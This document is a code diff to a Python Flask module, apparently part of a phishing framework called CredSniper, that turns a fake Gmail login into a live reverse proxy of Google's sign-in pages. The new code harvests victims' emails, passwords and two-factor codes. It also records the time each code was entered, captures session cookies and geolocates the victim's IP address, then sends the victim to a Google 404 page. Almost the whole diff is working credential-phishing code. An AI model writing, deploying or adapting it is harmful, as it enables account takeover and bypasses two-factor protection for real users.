@@ -3,11 +3,14 @@ from flask import redirect, request, jsonify, Markup
 from os import system
 from core import functions
 from core.base_module import *
-import uuid
-import mechanicalsoup
-import bs4
-import re, sys, time, random
+
+import re
+import sys
 import time
+import random
+import uuid
+import requests
+import bs4
 import json
 
 class GmailModule(BaseModule):
@@ -16,95 +19,82 @@ class GmailModule(BaseModule):
 
         self.set_name('gmail')
         self.add_route('main', '/')
-        self.add_route('accounts', '/accounts')
-        self.add_route('authenticate', '/authenticate')
-        self.add_route('redirect', '/redirect')
+
+        self.add_route('lookup', '/_/signin/sl/lookup')
+        self.add_route('signin', '/_/signin/sl/challenge')
+        self.add_route('twofactor', '/_/signin/challenge')
+        self.add_route('checkcookie', '/CheckCookie')
+        self.add_route('selectchallenge', '/_/signin/selectchallenge')
+
+        self.add_route('nothing', '/jserror')
+        self.add_route('nothing', '/log')
+
+        self.add_route('sleep_and_redirect', '/signin/v2/challenge/password/empty')
+
         self.enable_two_factor(enable_2fa)
+
+        self.twofactor_time = 0
+
+    def proxy_request(self, req):
+        headers = {}
+        for header in req.headers:
+            headers[header[0]] = header[1].replace(req.host, 'accounts.google.com')
+
+        cookies = {}
+        for cookie in self.cookies:
+            cookies[cookie] = self.cookies[cookie]
+
+        values = {}
+        for param in req.values.items():
+            values[param[0]] = param[1].replace(req.host, 'accounts.google.com')
+
+        server_response = requests.post('{}{}?{}'.format('https://accounts.google.com',req.path, req.query_string),
+                                        data=values,
+                                        headers=headers,
+                                        cookies=cookies)
+
+        page_content = server_response.text.replace('accounts.google.com', request.host)
+        page_content = page_content.replace('play.google.com', request.host)
+        page_content = page_content.replace('accounts.youtube.com', request.host)
+        return page_content
 
     def main(self):
         next_url = '/accounts'
-        template = self.env.get_template('login.html')
 
-        return template.render(
-            next_url=next_url,
-            hostname=request.host,
-        )
+        headers = {}
+        for header in request.headers:
+            headers[header[0]] = header[1].replace(request.host, 'accounts.google.com')
 
+        session = requests.Session()
+        server_response = session.get('https://accounts.google.com?hl=en', headers=headers)
 
-    def accounts(self):
-        self.user = request.values.get('email')
+        page_content = server_response.text.replace('accounts.google.com', request.host)
+        page_content = page_content.replace('play.google.com', request.host)
+        page_content = page_content.replace('accounts.youtube.com', request.host)
 
-        next_url = '/authenticate'
-        template = self.env.get_template('password.html')
+        # We dont want to handle Captchas and TOS. Lets leave that to Google
+        page_content = page_content.replace('/Captcha?', 'https://accounts.google.com/Captcha?')
+        page_content = page_content.replace('{}/TOS?'.format(request.host), 'accounts.google.com/TOS?')
 
-        return template.render(
-            hostname=request.host,
-            next_url=next_url,
-            email=self.user
-        )
+        self.cookies = session.cookies.get_dict()
 
+        return page_content
 
-    def authenticate(self):
-        self.user = request.values.get('email')
-        self.password = request.values.get('password')
+    def nothing(self):
+        return '[]'
 
-        functions.cache_creds(self.name, self.user, self.password)
+    def sleep_and_redirect(self):
+        time.sleep(10000)
+        return redirect('https://accounts.google.com/404', code=302)
 
-        triggered = self.trigger()
-        redirect_user = triggered.get('action', None)
-
-        if redirect_user == 'redirect':
-            return redirect(self.final_url, code=302)
-
-        if not self.enable_2fa:
-            return redirect(self.final_url, code=302)
-
-        twofactor_type = triggered.get('type', 'error')
-        twofactor_code = triggered.get('code', None)
-        twofactor_name = triggered.get('name', None)
-
-        if twofactor_type == 'touchscreen':
-            if twofactor_code:
-                additional = Markup(
-                    ', then touch number <strong>{}</strong>.'.format(
-                        twofactor_code
-                    )
-                )
-                twofactor_code = additional
-            else:
-                twofactor_code = '.'
-
-        tf_type = '{}.html'.format(twofactor_type)
-        template = self.env.get_template(tf_type)
-
-        next_url = '/redirect'
-
-        return template.render(
-            hostname=request.host,
-            next_url=next_url,
-            enable_2fa=self.enable_2fa,
-            email=self.user,
-            password=self.password,
-            code=twofactor_code,
-            name=twofactor_name,
-            two_factor_type=twofactor_type,
-            first_name=''
-        )
-
-
-    def redirect(self):
-        self.user = request.values.get('email')
-        self.password = request.values.get('password')
-        self.two_factor_token = request.values.get('two_factor_token')
-        self.two_factor_type = request.values.get('two_factor_type')
-
+    def checkcookie(self):
         city, region, zip_code = '','',''
         try:
             geoip_url = 'https://freegeoip.net/json/{}'.format(
                 request.remote_addr
             )
-            geo_browser = mechanicalsoup.StatefulBrowser()
-            geo_response = geo_browser.open(geoip_url)
+            geo_session = requests.Session()
+            geo_response = geo_session.get(geoip_url)
             geo = json.loads(geo_response.text)
             city = geo['city']
             region = geo['region_name']
@@ -121,154 +111,64 @@ class GmailModule(BaseModule):
             request.remote_addr,
             city,
             region,
-            zip_code
+            zip_code,
+            self.twofactor_time,
+            self.cookies
         )
-        return redirect(self.final_url, code=302)
 
+        return redirect("https://accounts.google.com/404", code=302)
 
-    def trigger(self):
-        raw_headers = None
+    def lookup(self):
+        self.user = json.loads(request.values.get('f.req'))[0]
 
-        data_2fa = {
-            'type': None,
-            'code': None,
-            'name': None,
-            'action': None,
-            'headers': [],
-            'cookies': [],
-        }
+        signin_response = self.proxy_request(request)
+        return signin_response.replace('[["gf.alr"', '[[["gf.alr"').replace(',["gf.ttu",1]', ',["gf.ttu",1]\n,["e",3,null,null,1620]\n]')
 
+    def signin(self):
+        self.password = json.loads(request.values.get('f.req'))[4][4][0]
+
+        functions.cache_creds(
+            self.name,
+            self.user,
+            self.password
+        )
+
+        signin_response = self.proxy_request(request).replace('[["gf.sicr"', '[[["gf.sicr"')
+
+        if "INCORRECT_ANSWER_ENTERED" in signin_response:
+            signin_response = '{}\n,["e",2,null,null,364]\n]]'.format(signin_response[0:len(signin_response)-1])
+        else:
+            if "TWO_STEP_VERIFICATION" in signin_response:
+                sms = signin_response.find('{"1009":[')
+                authenticator = signin_response.find('{"1006":[')
+                backup_codes = signin_response.find('{"1008":[')
+
+                if sms != -1 and (sms < authenticator and sms < backup_codes):
+                    self.two_factor_type = "sms"
+                elif authenticator != -1 and (authenticator < sms and authenticator < backup_codes):
+                    self.two_factor_type = "authenticator"
+                elif backup_codes != -1 and (backup_codes < authenticator and backup_codes < sms):
+                    self.two_factor_type = "backup_codes"
+                else:
+                    self.two_factor_type = "invite_or_security_key"
+
+            signin_response = '{},["e",3,null,null,871]\n]]'.format(signin_response[0:len(signin_response)-1])
+
+        return signin_response
+
+    def twofactor(self):
         try:
-            browser = mechanicalsoup.StatefulBrowser(
-                soup_config={'features': 'html'},
-                raise_on_404=True,
-                user_agent='Python-urllib/2.7',
-            )
-
-            page = browser.open('https://www.gmail.com')
-
-            user_form = browser.select_form('form')
-            user_form.set('Email', self.user)
-            user_response = browser.submit(user_form, page.url)
-
-            pass_form = mechanicalsoup.Form(user_response.soup.form)
-            pass_form.set('Passwd', self.password)
-            pass_response = browser.submit(pass_form, page.url)
-
-            raw_headers = pass_response.headers
-            soup = pass_response.soup
-            raw = soup.text
-
-            sms = soup.find('input', {'id': 'idvPreregisteredPhonePin'})
-            sms_old = soup.find('button', {'id': 'idvPreresteredPhoneSms'})
-            u2f = soup.find('input', {'id': 'id-challenge'})
-            touch = soup.find('input', {'id': 'authzenToken'})
-            authenticator = soup.find('input', {'id': 'totpPin'})
-            backup = soup.find('input', {'id': 'backupCodePin'})
-
-            if sms or sms_old:
-                data_2fa['type'] = 'sms'
-
-                if sms_old:
-                    final_form = mechanicalsoup.Form(pass_response.soup.form)
-                    final_response = browser.submit(final_form, page.url)
-                    raw_headers = final_response.headers
-                    raw = final_response.soup.text
-                    data_2fa['type'] = 'u2f'
-
-                code = ''
-                regexes = [
-                    r"\d{2}(?=</b>)",
-                    r"(?<=\u2022)\d{2}(?=G)",
-                    r"\d{2}(?=G)",
-                    r"\d{2}(?=\</b>)",
-                    r"\d{2}(?=S)",
-                ]
-                for regex in regexes:
-                    matches = re.search(regex, raw, re.UNICODE)
-                    if matches:
-                        code = matches.group()
-                        break
-                    else:
-                        code = '••'
-
-                data_2fa['code'] = code
-            elif u2f:
-                data_2fa['type'] = 'u2f'
-            elif touch:
-                code = ''
-                name = ''
-                regex_codes = [
-                    r"(?<=<b>)\d{1,3}(?=</b>)",
-                    r"(?<=then tap )\d{1,3}(?= on your phone)"
-                ]
-                for regex_code in regex_codes:
-                    code_match = re.search(regex_code, raw)
-                    if code_match:
-                        code = code_match.group()
-                    else:
-                        code = 0
-
-                regex_names = [
-                    r"(?<=Unlock your ).*(?=Tap)",
-                    r"(?<=Check your ).*(?=<\/h2>)",
-                ]
-                for regex_name in regex_names:
-                    name_match = re.search(regex_name, raw)
-                    if name_match:
-                        name = name_match.group()
-                    else:
-                        name = 'phone'
-
-                data_2fa['code'] = code
-                data_2fa['name'] = name
-                data_2fa['type'] = 'touchscreen'
-            elif authenticator:
-                name = ''
-                regexes = [
-                    r"(?<=Get a verification code from the <strong>).*(?=<\/strong>)",
-                    r"(?<=Get a verification code from the ).*(?= app)",
-                ]
-                for regex in regexes:
-                    name_match = re.search(regex, raw, re.UNICODE)
-                    if name_match:
-                        name = name_match.group()
-                    else:
-                        name = 'authenticator app'
-
-                data_2fa['name'] = name
-                data_2fa['type'] = 'authenticator'
-            elif backup:
-                data_2fa['type'] = 'backup'
-            else:
-                if 'Try again in a few hours' in raw:
-                    data_2fa['error'] ='locked out'
-                data_2fa['action'] = 'redirect'
-
-            cookies = []
-            for c in browser.get_cookiejar():
-                cookie = {}
-                cookie['name'] = c.name
-                cookie['value'] = c.value
-                cookie['domain'] = c.domain
-                cookie['path'] = c.path
-                cookie['secure'] = c.secure
-                cookie['expires'] = c.expires
-                cookies.append(cookie)
-
-            data_2fa['cookies'] = cookies
-
-            for h in raw_headers:
-                header = {}
-                header['name'] = h
-                header['value'] = raw_headers[h]
-                data_2fa['headers'].append(header)
-
+            self.two_factor_token = json.loads(request.values.get('f.req'))[4][5][0]
+            self.twofactor_time = int(time.time())
         except Exception as ex:
-            data_2fa['error'] = ex
             pass
 
-        return data_2fa
+        signin_response = self.proxy_request(request).replace('[["gf.sicr"', '[[["gf.sicr"')
+        return '{},["e",3,null,null,871]\n]]'.format(signin_response[0:len(signin_response)-1])
+
+    def selectchallenge(self):
+        signin_response = self.proxy_request(request).replace('[["gf.siscr"', '[[["gf.siscr"')
+        return '{},["e",3,null,null,871]\n]]'.format(signin_response[0:len(signin_response)-1])
 
 # REQUIRED: When module is loaded, credsniper calls load()
 def load(enable_2fa=False):
